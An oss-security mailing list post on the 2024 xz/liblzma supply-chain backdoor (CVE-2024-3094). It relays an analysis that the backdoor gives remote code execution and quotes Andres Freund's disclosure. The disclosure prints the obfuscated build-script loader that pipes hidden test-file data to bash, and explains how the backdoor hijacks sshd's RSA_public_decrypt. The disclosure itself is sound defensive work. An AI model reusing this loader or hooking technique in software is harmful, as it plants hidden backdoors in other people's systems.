Received: (qmail 7465 invoked by uid 550); 30 Mar 2024 19:46:34 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 7433 invoked from network); 30 Mar 2024 19:46:34 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20230601; t=1711827985; x=1712432785; darn=lists.openwall.com;
        h=content-transfer-encoding:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:from:to:cc:subject:date
         :message-id:reply-to;
        bh=N9RJ17FX/+AGOt3OZWLAWjh1qcWawMvSVsJky4CDEko=;
        b=gtD/jV359Ur1eZUY2Ozl00nJwTT9QqSyZaV9cAuMBHqyFtTP0KfI0Ir9DrCeDrCjFR
         +NlTLxSrbrPdxVSBKzg5Sc9WkG+pv8nHEhV5j6XU6RVbKc9SCdQNX4LE9oAwsaxhflCF
         3CK6ArXGPqV3As2c6rjNm7furKDNQU4fmpa1dyCFZrznSKwSTRai56v5Us45sMSQAa4Y
         +d2L+q4DNB9Lu4DztFAUxLmppQZctkKy0bPHS0qneaPgmBo6fsJHobxi6y9IwwUdKaUm
         PHPBrw/iIR2XxruPP5ePLkeTB5an/ZkXPsmNgBeus8p8LKGH1m81VuClesF8uc24DnCN
         Y87w==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20230601; t=1711827985; x=1712432785;
        h=content-transfer-encoding:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:x-gm-message-state:from:to:cc
         :subject:date:message-id:reply-to;
        bh=N9RJ17FX/+AGOt3OZWLAWjh1qcWawMvSVsJky4CDEko=;
        b=cMeDeJK7xX1mGWCyHClmlfW4tx/wT2NwssBf94XrD4R1c2563NN6cVHqbJTZ3oA+2+
         6/zCBx9zUjSO2GzawmmRFZva8yFLy5bWXKte8/1WARX96wIyPu2LcgmkRJf5sVokxyGy
         kwnPGed6uCMfvg9cApeHZL0loqSl9mqzmnnQ8TdSkvM8tB7S15OvpjlDy1jUroLibpRo
         S92TDbwhvCJPZvBoqtJrp5WJhHvFCp/TjApOCr0+jGeO9Tpo0V/5zfMq05tXM5tU7waF
         5n+3xHEj5xO1DtSHdcCbByqDDB2nPPaRrj0hPhvLwr4Cdb74wnUztLbx+ww/JVGOj3MP
         /1rg==
X-Gm-Message-State: AOJu0YyB3Q5HVVvBr3wwzPB3lIbqVEq0JR2bW6+D9z/UTbrT5sI6SAoh
	a8SVSNWxj6xSFAJpFJ3FbhXHI+DJFA34jfslCcnvaxwvM0y/5kBsds6sqJiIXSwviEMtCd9GP7m
	r7FfItqxpVxfgwAMclbDqhOb+wCXtevQa9tvQ+Q==
X-Google-Smtp-Source: AGHT+IEcIgCtsNCtgy6MSHSf3r8pCe+IUOYazrYeoZwVf+eEHcOVC0XmKFlqaGzb06Xs+BIH95dWtD1w85G3fjRmrZU=
X-Received: by 2002:ad4:4049:0:b0:696:b4d3:3308 with SMTP id
 r9-20020ad44049000000b00696b4d33308mr5481000qvp.12.1711827985330; Sat, 30 Mar
 2024 12:46:25 -0700 (PDT)
MIME-Version: 1.0
References: <20240329155126.kjjfduxw2yrlxgzm@awork3.anarazel.de>
In-Reply-To: <20240329155126.kjjfduxw2yrlxgzm@awork3.anarazel.de>
From: "Alexander E. Patrakov" <patrakov@gmail.com>
Date: Sun, 31 Mar 2024 03:45:58 +0800
Message-ID: <CAN_LGv3oHFcmVS4vxyz4nxfQ7F9Vr1f-JB8ZqYfD9Q8vuTsEsA@mail.gmail.com>
To: oss-security@lists.openwall.com
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable
Subject: Re: [oss-security] backdoor in upstream xz/liblzma leading to ssh
 server compromise

Let me reshare one more piece of information: this backdoor is an RCE,
not an authentication bypass.

https://bsky.app/profile/filippo.abyssdomain.expert/post/3kowjkx2njy2b

Copy-pasting all the text written by Filippo Valsorda from there below.

=3D=3D=3D=3D=3D
Filippo Valsorda
@filippo.abyssdomain.expert
I'm watching some folks reverse engineer the xz backdoor, sharing some
*preliminary* analysis with permission. The hooked RSA_public_decrypt
verifies a signature on the server's host key by a fixed Ed448 key,
and then passes a payload to system(). It's RCE, not auth bypass, and
gated/unreplayable.

This might be the best executed supply chain attack we've seen
described in the open, and it's a nightmare scenario: malicious,
competent, authorized upstream in a widely used library. Looks like
this got caught by chance. Wonder how long it would have taken
otherwise.

The payload is extracted from the N value (the public key) passed to
RSA_public_decrypt, checked against a simple fingerprint, and
decrypted with a fixed ChaCha20 key before the Ed448 signature
verification.

RSA_public_decrypt is a (weirdly named) signature verification
function. https://www.openssl.org/docs/manmaster/man3/RSA_public_decrypt.ht=
ml
(Why "decrypt"? RSA sig verification is the same op of RSA encryption.
=F0=9F=A4=B7=E2=80=8D=E2=99=82=EF=B8=8F)

The RSA_public_decrypt public key can be attacker-controlled pre-auth
by using OpenSSH certificates. OpenSSH certs are weird in that they
include the signer's public key. OpenSSH checks the signature on
parsing. https://github.com/openssh/openssh-portable/blob/281ea25a44bff53ee=
fb4af7bab7aa670b1f8b6b2/PROTOCOL.certkeys#L207-L219

Here's a script by Keegan Ryan for sending a custom public key in a
certificate, which on a backdoored system will reach the hooked
function. https://gist.github.com/keeganryan/a6c22e1045e67c17e88a606dfdf95a=
e4

Apparently the backdoor reverts back to regular operation if the
payload is malformed or the signature from the attacker's key doesn't
verify. Unfortunately, this means that unless a bug is found, we can't
write a reliable/reusable over-the-network scanner.

On Sat, Mar 30, 2024 at 12:09=E2=80=AFAM Andres Freund <andres@anarazel.de>=
 wrote:
>
> Hi,
>
> After observing a few odd symptoms around liblzma (part of the xz package=
) on
> Debian sid installations over the last weeks (logins with ssh taking a lo=
t of
> CPU, valgrind errors) I figured out the answer:
>
> The upstream xz repository and the xz tarballs have been backdoored.
>
> At first I thought this was a compromise of debian's package, but it turn=
s out
> to be upstream.
>
>
> =3D=3D Compromised Release Tarball =3D=3D
>
> One portion of the backdoor is *solely in the distributed tarballs*. For
> easier reference, here's a link to debian's import of the tarball, but it=
 is
> also present in the tarballs for 5.6.0 and 5.6.1:
>
> https://salsa.debian.org/debian/xz-utils/-/blob/debian/unstable/m4/build-=
to-host.m4?ref_type=3Dheads#L63
>
> That line is *not* in the upstream source of build-to-host, nor is
> build-to-host used by xz in git.  However, it is present in the tarballs
> released upstream, except for the "source code" links, which I think gith=
ub
> generates directly from the repository contents:
>
> https://github.com/tukaani-project/xz/releases/tag/v5.6.0
> https://github.com/tukaani-project/xz/releases/tag/v5.6.1
>
>
> This injects an obfuscated script to be executed at the end of configure.=
 This
> script is fairly obfuscated and data from "test" .xz files in the reposit=
ory.
>
>
> This script is executed and, if some preconditions match, modifies
> $builddir/src/liblzma/Makefile to contain
>
> am__test =3D bad-3-corrupt_lzma2.xz
> ...
> am__test_dir=3D$(top_srcdir)/tests/files/$(am__test)
> ...
> sed rpath $(am__test_dir) | $(am__dist_setup) >/dev/null 2>&1
>
>
> which ends up as
> ...; sed rpath ../../../tests/files/bad-3-corrupt_lzma2.xz | tr "        =
\-_" "         _\-" | xz -d | /bin/bash >/dev/null 2>&1; ...
>
> Leaving out the "| bash" that produces
>
> ####Hello####
> #=EF=BF=BD=EF=BF=BDZ=EF=BF=BD.hj=EF=BF=BD
> eval `grep ^srcdir=3D config.status`
> if test -f ../../config.status;then
> eval `grep ^srcdir=3D ../../config.status`
> srcdir=3D"../../$srcdir"
> fi
> export i=3D"((head -c +1024 >/dev/null) && head -c +2048 && (head -c +102=
4 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +20=
48 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/n=
ull) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (he=
ad -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && h=
ead -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +10=
24 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2=
048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/=
null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (h=
ead -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && =
head -c +2048 && (head -c +1024 >/dev/null) && head -c +724)";(xz -dc $srcd=
ir/tests/files/good-large_compressed.lzma|eval $i|tail -c +31265|tr "\5-\51=
\204-\377\52-\115\132-\203\0-\4\116-\131" "\0-\377")|xz -F raw --lzma1 -dc|=
/bin/sh
> ####World####
>
> After de-obfuscation this leads to the attached injected.txt.
>
>
> =3D=3D Compromised Repository =3D=3D
>
> The files containing the bulk of the exploit are in an obfuscated form in
>   tests/files/bad-3-corrupt_lzma2.xz
>   tests/files/good-large_compressed.lzma
> committed upstream. They were initially added in
> https://github.com/tukaani-project/xz/commit/cf44e4b7f5dfdbf8c78aef377c10=
f71e274f63c0
>
> Note that the files were not even used for any "tests" in 5.6.0.
>
>
> Subsequently the injected code (more about that below) caused valgrind er=
rors
> and crashes in some configurations, due the stack layout differing from w=
hat
> the backdoor was expecting.  These issues were attempted to be worked aro=
und
> in 5.6.1:
>
> https://github.com/tukaani-project/xz/commit/e5faaebbcf02ea880cfc56edc702=
d4f7298788ad
> https://github.com/tukaani-project/xz/commit/72d2933bfae514e0dbb123488e9f=
1eb7cf64175f
> https://github.com/tukaani-project/xz/commit/82ecc538193b380a21622aea02b0=
ba078e7ade92
>
> For which the exploit code was then adjusted:
> https://github.com/tukaani-project/xz/commit/6e636819e8f070330d835fce4628=
9a3ff72a7b89
>
> Given the activity over several weeks, the committer is either directly
> involved or there was some quite severe compromise of their
> system. Unfortunately the latter looks like the less likely explanation, =
given
> they communicated on various lists about the "fixes" mentioned above.
>
>
> Florian Weimer first extracted the injected code in isolation, also attac=
hed,
> liblzma_la-crc64-fast.o, I had only looked at the whole binary. Thanks!
>
>
> =3D=3D Affected Systems =3D=3D
>
> The attached de-obfuscated script is invoked first after configure, where=
 it
> decides whether to modify the build process to inject the code.
>
> These conditions include targeting only x86-64 linux:
>     if ! (echo "$build" | grep -Eq "^x86_64" > /dev/null 2>&1) && (echo "=
$build" | grep -Eq "linux-gnu$" > /dev/null 2>&1);then
>
> Building with gcc and the gnu linker
>     if test "x$GCC" !=3D 'xyes' > /dev/null 2>&1;then
>     exit 0
>     fi
>     if test "x$CC" !=3D 'xgcc' > /dev/null 2>&1;then
>     exit 0
>     fi
>     LDv=3D$LD" -v"
>     if ! $LDv 2>&1 | grep -qs 'GNU ld' > /dev/null 2>&1;then
>     exit 0
>
> Running as part of a debian or RPM package build:
>     if test -f "$srcdir/debian/rules" || test "x$RPM_ARCH" =3D "xx86_64";=
then
>
> Particularly the latter is likely aimed at making it harder to reproduce =
the
> issue for investigators.
>
>
> Due to the working of the injected code (see below), it is likely the bac=
kdoor
> can only work on glibc based systems.
>
>
> Luckily xz 5.6.0 and 5.6.1 have not yet widely been integrated by linux
> distributions, and where they have, mostly in pre-release versions.
>
>
> =3D=3D Observing Impact on openssh server =3D=3D
>
> With the backdoored liblzma installed, logins via ssh become a lot slower.
>
> time ssh nonexistant@localhost
>
> before:
> nonexistant@localhost: Permission denied (publickey).
>
> before:
> real    0m0.299s
> user    0m0.202s
> sys     0m0.006s
>
> after:
> nonexistant@localhost: Permission denied (publickey).
>
> real    0m0.807s
> user    0m0.202s
> sys     0m0.006s
>
>
> openssh does not directly use liblzma. However debian and several other
> distributions patch openssh to support systemd notification, and libsyste=
md
> does depend on lzma.
>
>
> Initially starting sshd outside of systemd did not show the slowdown, des=
pite
> the backdoor briefly getting invoked. This appears to be part of some
> countermeasures to make analysis harder.
>
> Observed requirements for the exploit:
> a) TERM environment variable is not set
> b) argv[0] needs to be /usr/sbin/sshd
> c) LD_DEBUG, LD_PROFILE are not set
> d) LANG needs to be set
> e) Some debugging environments, like rr, appear to be detected. Plain gdb
>    appears to be detected in some situations, but not others
>
> To reproduce outside of systemd, the server can be started with a clear
> environment, setting only the required variable:
>
> env -i LANG=3Den_US.UTF-8 /usr/sbin/sshd -D
>
>
> In fact, openssh does not need to be started as a server to observe the
> slowdown:
>
> slow:
> env -i LANG=3DC /usr/sbin/sshd -h
>
> (about 0.5s on my older system)
>
>
> fast:
> env -i LANG=3DC TERM=3Dfoo /usr/sbin/sshd -h
> env -i LANG=3DC LD_DEBUG=3Dstatistics /usr/sbin/sshd -h
> ...
>
> (about 0.01s on the same system)
>
>
> It's possible that argv[0] other /usr/sbin/sshd also would have effect - =
there
> are obviously lots of servers linking to libsystemd.
>
>
> =3D=3D Analyzing the injected code =3D=3D
>
> I am *not* a security researcher, nor a reverse engineer.  There's lots of
> stuff I have not analyzed and most of what I observed is purely from
> observation rather than exhaustively analyzing the backdoor code.
>
> To analyze I primarily used "perf record -e intel_pt//ub" to observe where
> execution diverges between the backdoor being active and not. Then also g=
db,
> setting breakpoints before the divergence.
>
>
> The backdoor initially intercepts execution by replacing the ifunc resolv=
ers
> crc32_resolve(), crc64_resolve() with different code, which calls
> _get_cpuid(), injected into the code (which previously would just be stat=
ic
> inline functions).  In xz 5.6.1 the backdoor was further obfuscated, remo=
ving
> symbol names.
>
> These functions get resolved during startup, because sshd is built with
> -Wl,-z,now, leading to all symbols being resolved early. If started with
> LD_BIND_NOT=3D1 the backdoor does not appear to work.
>
>
> Below crc32_resolve() _get_cpuid() does not do much, it just sees that a
> 'completed' variable is 0 and increments it, returning the normal cpuid r=
esult
> (via a new _cpuid()). It gets to be more interesting during crc64_resolve=
().
>
> In the second invocation crc64_resolve() appears to find various informat=
ion,
> like data from the dynamic linker, program arguments and environment. The=
n it
> perform various environment checks, including those above. There are other
> checks I have not fully traced.
>
> If the above decides to continue, the code appears to be parsing the symb=
ol
> tables in memory. This is the quite slow step that made me look into the =
issue.
>
>
> Notably liblzma's symbols are resolved before many of the other libraries,
> including the symbols in the main sshd binary.  This is important because
> symbols are resolved, the GOT gets remapped read-only thanks to -Wl,-z,re=
lro.
>
>
> To be able to resolve symbols in libraries that have not yet loaded, the
> backdoor installs an audit hook into the dynamic linker, which can be obs=
erved
> with gdb using
>   watch _rtld_global_ro._dl_naudit
> It looks like the audit hook is only installed for the main binary.
>
> That hook gets called, from _dl_audit_symbind, for numerous symbols in the
> main binary. It appears to wait for "RSA_public_decrypt@got.plt" to be
> resolved.  When called for that symbol, the backdoor changes the value of
> RSA_public_decrypt@got.plt to point to its own code.  It does not do this=
 via
> the audit hook mechanism, but outside of it.
>
> For reasons I do not yet understand, it does change sym.st_value *and* the
> return value of from the audit hook to a different value, which leads
> _dl_audit_symbind() to do nothing - why change anything at all then?
>
> After that the audit hook is uninstalled again.
>
> It is possible to change the got.plt contents at this stage because it ha=
s not
> (and can't yet) been remapped to be read-only.
>
>
> I suspect there might be further changes performed at this stage.
>
>
> =3D=3D Impact on sshd =3D=3D
>
> The prior section explains that RSA_public_decrypt@got.plt was redirected=
 to
> point into the backdoor code. The trace I was analyzing indeed shows that
> during a pubkey login the exploit code is invoked:
>
>             sshd 1736357 [010] 714318.734008:          1  branches:uH:   =
   5555555ded8c ssh_rsa_verify+0x49c (/usr/sbin/sshd) =3D>     5555555612d0=
 RSA_public_decrypt@plt+0x0 (/usr/sbin/sshd)
>
> The backdoor then calls back into libcrypto, presumably to perform normal=
 authentication
>
>             sshd 1736357 [010] 714318.734009:          1  branches:uH:   =
   7ffff7c137cd [unknown] (/usr/lib/x86_64-linux-gnu/liblzma.so.5.6.0) =3D>=
     7ffff792a2b0 RSA_get0_key+0x0 (/usr/lib/x86_64-linux-gnu/libcrypto.so.=
3)
>
>
> I have not yet analyzed precisely what is being checked for in the inject=
ed
> code, to allow unauthorized access. Since this is running in a
> pre-authentication context, it seems likely to allow some form of access =
or
> other form of remote code execution.
>
> I'd upgrade any potentially vulnerable system ASAP.
>
>
> =3D=3D Bug reports =3D=3D
>
> Given the apparent upstream involvement I have not reported an upstream
> bug. As I initially thought it was a debian specific issue, I sent a more
> preliminary report to security@debian.org.  Subsequently I reported the i=
ssue
> to distros@. CISA was notified by a distribution.
>
> Red Hat assigned this issue CVE-2024-3094.
>
>
> =3D=3D Detecting if installation is vulnerable =3D=3D
>
> Vegard Nossum wrote a script to detect if it's likely that the ssh binary=
 on a
> system is vulnerable, attached here. Thanks!
>
>
> Greetings,
>
> Andres Freund



--=20
Alexander E. Patrakov
